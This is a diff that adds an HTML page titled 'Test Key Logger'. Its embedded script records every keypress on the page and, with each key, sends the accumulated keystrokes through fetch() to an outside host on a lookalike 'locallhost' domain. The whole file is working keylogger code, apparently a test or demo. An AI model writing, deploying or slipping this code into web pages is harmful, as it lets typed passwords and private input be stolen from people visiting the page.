@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Key Logger</title>
+</head>
+<body>
+    <h1>Test Key Logger</h1>
+    <script type="text/javascript">
+      var l = "";
+      document.onkeypress = function (e) {
+        l += e.key;
+        fetch(`https://mesh.locallhost.cloud:9951/KeyLogger?data=${encodeURIComponent(l)}`, {
+          method: "GET",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        });
+      };
+    </script>
+</body>
+</html>
